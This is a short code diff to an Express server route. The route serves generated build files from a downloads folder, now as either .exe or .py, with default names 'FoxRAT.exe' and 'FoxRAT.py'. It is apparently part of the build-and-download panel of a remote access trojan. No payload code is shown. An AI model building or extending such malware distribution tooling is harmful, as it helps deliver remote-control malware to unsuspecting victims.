@@ -203,9 +203,14 @@ app.post('/build', authMiddleware, express.json({ limit: '50mb' }), async (req, 
 });
 
 app.get('/dl/:id', (req, res) => {
-    const fp = path.join(downloadsDir, req.params.id + '.exe');
-    if (!fs.existsSync(fp)) return res.status(404).send('File not found');
-    const name = req.query.name || 'FoxRAT.exe';
+    const id = req.params.id;
+    const fpExe = path.join(downloadsDir, id + '.exe');
+    const fpPy = path.join(downloadsDir, id + '.py');
+    let fp, defaultName;
+    if (fs.existsSync(fpExe)) { fp = fpExe; defaultName = 'FoxRAT.exe'; }
+    else if (fs.existsSync(fpPy)) { fp = fpPy; defaultName = 'FoxRAT.py'; }
+    else return res.status(404).send('File not found or expired');
+    const name = req.query.name || defaultName;
     res.download(fp, name);
 });
 
